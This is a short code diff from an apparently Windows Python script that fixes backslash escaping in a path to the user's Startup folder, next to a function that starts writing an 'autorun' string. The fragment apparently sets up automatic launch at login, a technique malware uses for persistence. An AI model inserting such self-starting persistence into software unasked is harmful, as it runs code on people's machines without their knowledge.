@@ -5,7 +5,7 @@ import ctypes
 import win32con , win32api
 
 filename=sys.argv[0]
-work_home="C:\Users\{0}\AppData\Roaming\Microsoft\Windows\{1}\Programs\Startup".format(os.getlogin(),'Start Menu')
+work_home="C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\{1}\\Programs\\Startup".format(os.getlogin(),'Start Menu')
 
 def writeconfig():
     autorun='''
